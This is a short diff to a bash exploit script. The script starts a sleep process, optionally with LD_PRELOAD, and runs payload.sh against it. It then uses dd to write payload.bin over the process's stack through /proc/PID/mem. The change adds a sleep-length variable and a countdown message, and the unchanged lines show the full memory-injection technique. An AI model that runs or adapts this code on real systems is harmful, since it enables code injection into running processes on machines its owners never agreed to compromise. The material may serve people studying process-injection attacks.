@@ -1,4 +1,6 @@
 #!/bin/bash
+STARTTIME=$(date +%s)
+SLEEPLEN=90
 echo "Preparing for exploitation, finding LD_PRELOAD if necessary" >&2
 sleep 30 2>/dev/null &
 PID=$!
@@ -12,7 +14,7 @@ else
 	echo "Ready to exploit, without LD_PRELOAD" >&2
 fi
 
-LD_PRELOAD="${PRELOAD[@]}" sleep 90 2>/dev/null &
+LD_PRELOAD="${PRELOAD[@]}" sleep ${SLEEPLEN} 2>/dev/null &
 PID=$!
 echo pid: ${PID} >&2
 bash payload.sh ${PID} $@
@@ -30,5 +32,5 @@ IFS="-" read -r -a STACK <<< "${STACKRANGE}"
 PAYLOADSIZE=$(($((16#${STACK[1]}))-$((16#${STACK[0]}))))
 
 echo "Overwriting stack..." >&2
-echo "Be patient for sleep to terminate" >&2
+echo "Be patient for sleep to terminate (approx $((${SLEEPLEN}-$(($(date +%s)-${STARTTIME})))) seconds)" >&2
 exec dd if=payload.bin of=/proc/${PID}/mem seek=$((16#${STACK[0]})) conv=notrunc status=none bs=1
